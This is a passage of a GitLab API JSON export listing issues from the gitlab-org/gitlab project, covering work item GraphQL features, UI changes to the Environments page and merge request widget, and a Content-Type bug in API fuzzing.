Ultimate","GraphQL","backend","devops::manage","documentation","feature::addition","group::integrations","release post item","release post item::in review","section::dev","type::feature","workflow::in review"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":92994,"username":"fabsrc","name":"Fabian Schneider","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/92994/FS.jpg","web_url":"https://gitlab.com/fabsrc"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":92994,"username":"fabsrc","name":"Fabian Schneider","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/92994/FS.jpg","web_url":"https://gitlab.com/fabsrc"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353642","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353642","notes":"https://gitlab.com/api/v4/projects/278964/issues/353642/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353642/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353642","relative":"#353642","full":"gitlab-org/gitlab#353642"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":8865,"epic":{"id":612987,"iid":8865,"title":"Improve ways for REST API and GraphQL consumers to learn of deprecations","url":"/groups/gitlab-org/-/epics/8865","group_id":9970,"human_readable_end_date":"Nov 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102952375,"iid":353632,"project_id":278964,"title":"Allow fetching only taskable work item types","description":"Following up on https://gitlab.com/gitlab-org/gitlab/-/issues/346042#note_816906469\n\nWe need a way to filter the GraphQL query `project.workItemTypes` and `group.workItemTypes` so it returns only taskable work item types","state":"closed","created_at":"2022-02-23T19:48:03.199Z","updated_at":"2022-03-15T20:45:56.449Z","closed_at":"2022-03-15T20:45:56.430Z","closed_by":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"labels":["auto updated","devops::plan","group::project management","section::dev","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"type":"ISSUE","assignee":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353632","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353632","notes":"https://gitlab.com/api/v4/projects/278964/issues/353632/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353632/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353632","relative":"#353632","full":"gitlab-org/gitlab#353632"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7110,"epic":{"id":382837,"iid":7110,"title":"🚀 Create a new Task work item from Markdown Task","url":"/groups/gitlab-org/-/epics/7110","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":102952091,"iid":353631,"project_id":278964,"title":"Keep expanded state for details in the Environments page","description":"\u003c!-- The first section \"Release notes\" is required if you want to have your release post blog MR auto generated. Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e \n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve\n\n\u003c!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, \"As a (who), I want (what), so I can (why/value).\" --\u003e\n\nAs a user, I want to see the details for an environment when browsing the overview page at a glance, so that I can quickly understand what's going on with my deployments.\n\n### Intended users\n\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Ingrid (Infrastructure Operator)](https://about.gitlab.com/handbook/product/personas/#ingrid-infrastructure-operator)\n* [Dakota (Application Development Director)](https://about.gitlab.com/handbook/product/personas/#dakota-application-development-director)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n\n--\u003e\n\n### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses?\nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e\n\nThe user should be able to see the details for an environment without having to click the `show details` button.\n\n### Proposal\n\n\u003c!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey --\u003e\n\n* In the environments page, we will remove the `show details` button and the expand/collapse functionality that is triggered when the user clicks on it.\n* The user should always see the triggerer, job, and branch information.\n* This will remove one click from the UI interaction.\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\n### Permissions and Security\n\n* [ ] Add expected impact to members with no access\n* [ ] Add expected impact to Guest\n* [ ] Add expected impact to Reporter\n* [x] Add expected impact to Developer\n* [x] Add expected impact to Maintainer\n* [x] Add expected impact to Owner\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n\nPlease consider performing a threat model for the code changes that are introduced as part of this feature. To get started, refer to our Threat Modeling handbook page https://about.gitlab.com/handbook/security/threat_modeling/#threat-modeling.\n\nDon't hesitate to reach out to the Application Security Team (`@gitlab-com/gl-security/appsec`) to discuss any security concerns.\n--\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\nYes, this change will require an update to the docs. Please include ~\"Technical Writing\" for review.\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the Quality Engineering quad planning and test planning processes and reach out to your counterpart Software Engineer in Test for assistance. \nQuad Planning: https://about.gitlab.com/handbook/engineering/quality/quality-engineering/quad-planning \nTest Planning: https://about.gitlab.com/handbook/engineering/quality/quality-engineering/test-engineering/#test-planning --\u003e\n\n### Available Tier\n\n\u003c!-- This section should be used for setting the appropriate tier that this feature will belong to. Pricing can be found here: https://about.gitlab.com/pricing/\n\n* Free\n* Premium/Silver\n* Ultimate/Gold\n--\u003e\n\n* Free\n\n### Feature Usage Metrics\n\n\u003c!-- How are you going to track usage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n--\u003e\n\nWe can measure it by tracking clicks on the page, to understand how users engage with the application.\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#three-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### What is the competitive advantage or differentiation for this feature?\n\n### Links / references\n\n\u003c!-- Label reminders - you should have one of each of the following labels.\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2022-02-23T19:40:45.771Z","updated_at":"2022-09-21T12:04:24.596Z","closed_at":"2022-08-26T14:15:40.173Z","closed_by":{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"},"labels":["Actionable Insight::Product change","Category:Environment Management","Deliverable","GitLab Free","Next Up","Release::P1","UX","UX solution validation","closed::complete","devops::release","feature::addition","frontend","group::release","section::ops","severity::3","type::feature","usability","workflow::post-deploy-db-production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"}],"author":{"id":8059235,"username":"dfosco","name":"Daniel Fosco","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8059235/avatar.png","web_url":"https://gitlab.com/dfosco"},"type":"ISSUE","assignee":{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"},"user_notes_count":22,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353631","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":3},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353631","notes":"https://gitlab.com/api/v4/projects/278964/issues/353631/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353631/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353631","relative":"#353631","full":"gitlab-org/gitlab#353631"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":102951226,"iid":353628,"project_id":278964,"title":"[MR Widget Restructure] Auto-Merge: Show merge details in lower area","description":"### Problem\n\nThe `Auto-Merge` state MR Widget is still showing the pre-merge state in its lower half (including form controls, buttons, etc.).\n\n\u003cimg src=\"/uploads/a264da83e208bb6854f63d478ac39a58/CleanShot_20211221123013.png\" width=\"750px\" /\u003e\n\n### Target\n\nThe `Auto-Merge` state should look like [the Figma design](https://www.figma.com/file/33KrJ7p9eTHlneMiSBDf57/Restructure-MR-merge-widget-%265589?node-id=1525%3A3777):\n\n\u003cimg src=\"/uploads/0da81769d31fa5f890bd4505f572f44f/image.png\" width=\"750px\" /\u003e\n\n#### Notes\n\nThere are two steps that need to happen here:\n\n1. Show the `Merge Details` section instead of the \"Ready to Merge\" controls.\n2. Move the second line of text from the top section into the Merge Details section.\n\n### See Also\n\n- [Spawning MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71721)\n- [Parent Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/344835), [specific comment](https://gitlab.com/gitlab-org/gitlab/-/issues/344835#note_791467355)","state":"closed","created_at":"2022-02-23T19:19:40.520Z","updated_at":"2022-05-24T12:00:24.336Z","closed_at":"2022-04-28T10:19:16.163Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Deliverable","devops::create","feature::enhancement","frontend","group::code review","merge request widget","merge requests","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353628","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353628","notes":"https://gitlab.com/api/v4/projects/278964/issues/353628/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353628/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353628","relative":"#353628","full":"gitlab-org/gitlab#353628"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5589,"epic":{"id":224926,"iid":5589,"title":"Restructure MR merge widget","url":"/groups/gitlab-org/-/epics/5589","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102947069,"iid":353624,"project_id":278964,"title":"Backend Spike For Work Item Widget Architecture / Work Item Descriptions","description":" In order to deliver https://gitlab.com/gitlab-org/gitlab/-/issues/334809, we need to implement Description as a widget for Tasks. I've opened this issue to track that work, as well as summarize the discussion that happened many months ago in https://gitlab.com/gitlab-org/gitlab/-/issues/335110. Based on the discussion in this thread https://gitlab.com/gitlab-org/gitlab/-/issues/335110#note_621789974 - it seems like there was a general consensus around the following architecture for widgets in the database. I think this diagram was created prior to actually writing any of the work items code so there may be some inconsistency, but we're not far off from what's represented here:\n\n![image](/uploads/e2ed4c99e8add57622019ec0388a4c75/image.png)\n\n---\n\n## Spike\n\n- [ ] Determine appropriate implementation and architecture for widgets via writing a PoC that implements Description, Assignee, Weight, Milestone, and Date (maybe?) widgets.\n- [ ] Update https://docs.gitlab.com/ee/development/work_items.html#widgets-metadata with the decided upon implementation path.\n- [ ] Keep further out things in mind when deciding the path forward (ex: https://gitlab.com/gitlab-org/gitlab/-/issues/354022+)\n\n## Acceptance criteria:\n\n1. A Work Item (of type Task) can have a Description widget\n1. The description can be fetched via the WorkItem query in GraphQL\n1. The description can be updated via GraphQL\n1. Updates to the description can be subscribed to via GraphQL\n1. Redis counter\n\n## Trackers\n\n- **name:** `users_updating_work_item_description`\n- **category:** `work_items`\n- **redis_slot:** `users` \n- **include in the following aggregation counters:**\n  - [x] `xmau_plan`\n  - [x] `xmau_project_management`\n  - [ ] `xmau_product_planning`\n  - [ ] `xmau_certify`\n  - [x] `users_work_items`\n- **documentation:** [Service Ping Implementation](https://docs.gitlab.com/ee/development/service_ping/implement.html), [Redis HLL Counters](https://docs.gitlab.com/ee/development/service_ping/implement.html#redis-hll-counters)\n\n\n## Open Questions\n\n1. Are widgets editable via the WorkItemUpdate mutation or do they have their own mutations?","state":"closed","created_at":"2022-02-23T18:41:06.718Z","updated_at":"2022-09-08T15:51:35.181Z","closed_at":"2022-05-03T18:04:25.786Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Deliverable","backend","devops::plan","group::project management","quad-planning::complete-no-action","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":5965371,"username":"jlear","name":"Jake Lear","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5965371/avatar.png","web_url":"https://gitlab.com/jlear"},"type":"ISSUE","assignee":{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},"user_notes_count":27,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353624","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":3},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353624","notes":"https://gitlab.com/api/v4/projects/278964/issues/353624/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353624/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353624","relative":"#353624","full":"gitlab-org/gitlab#353624"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7168,"epic":{"id":390058,"iid":7168,"title":"✍️ Work Items - View and update the description of a Work Item","url":"/groups/gitlab-org/-/epics/7168","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":{"id":48486,"iid":61,"sequence":14,"group_id":9970,"title":"Iteration 14","description":null,"state":3,"created_at":"2022-02-15T00:05:01.813Z","updated_at":"2022-05-11T00:05:05.423Z","start_date":"2022-04-27","due_date":"2022-05-10","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/48486"},"health_status":null},{"id":102946212,"iid":353620,"project_id":278964,"title":"API Security:  Generated Request sets generic ContentType instead of provided Content Type","description":"### Summary\n\nAPI Security (API Fuzzing/DAST API) consumes OpenApi document. An OpenApi document provides ContentTypes in the form of Media Types. A media type can be very generic (e.g. `application/json`) or be more specific `application/vnd.api+json; encoding=utf-8`.\n\nThe bug happens when the user provides specific Content-Types and the generated requests use a generic Content-Type. The expected content type should be the same as the given by the OpenApi document.\n\n### Steps to reproduce\n\n1. Use either API Fuzzing or DAST API\n1. Use an OpenApi document that uses a specific supported media type (e.g. `application/vnd.api+json`)\n1. Check the generated requests, they will be using the generic version instead of the specific.\n\n### Example Project\n\n- \n\n### What is the current *bug* behavior?\n\n\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n- `OpenApiReader.cs` already have access to the requested ContentType. Remove generic content type and use requested instead.","state":"closed","created_at":"2022-02-23T18:23:51.688Z","updated_at":"2022-03-18T20:21:05.283Z","closed_at":"2022-03-18T20:18:59.208Z","closed_by":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"labels":["Category:Fuzz Testing","GitLab Ultimate","backend","devops::secure","group::dynamic analysis","priority::3","section::sec","severity::3","type::bug","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"}],"author":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"type":"ISSUE","assignee":{"id":7488329,"username":"herbmadrigal","name":"Herber Madrigal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7488329/avatar.png","web_url":"https://gitlab.com/herbmadrigal"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353620","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353620","notes":"https://gitlab.com/api/v4/projects/278964/issues/353620/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353620/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353620","relative":"#353620","full":"gitlab-org/gitlab#353620"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":102946044,"iid":353618,"project_id":278964,"title":"[MR Widget Restructure] Merging: Show merge details in lower area","description":"### Problem\n\nThe `Merging` state MR Widget is still showing the pre-merge state in its lower half (including form controls, buttons, etc.).\n\n\u003cimg src=\"/uploads/8862661ecdeacf687b73a51472c64204/image.png\" width=\"750px\" /\u003e\n\n### Target\n\nThe `Merging` state should look like [the Figma design](https://www.figma.com/file/33KrJ7p9eTHlneMiSBDf57/Restructure-MR-merge-widget-%265589?node-id=1525%3A3765):\n\n\u003cimg src=\"/uploads/e800b225f79bf1e15131412a90b21c65/image.png\" width=\"750px\" /\u003e\n\n#### Notes\n\nThere are two steps that need to happen here:\n\n1. Show the `Merge Details` section instead of the \"Ready to Merge\" controls.\n2. Move the second line of text from the top section into the Merge Details section.\n\n### See Also\n\n- [Spawning MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71721)\n- [Parent Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/344835), [specific comment](https://gitlab.com/gitlab-org/gitlab/-/issues/344835#note_791467355)","state":"closed","created_at":"2022-02-23T18:19:48.932Z","updated_at":"2022-05-24T12:00:24.425Z","closed_at":"2022-04-28T10:19:12.993Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil 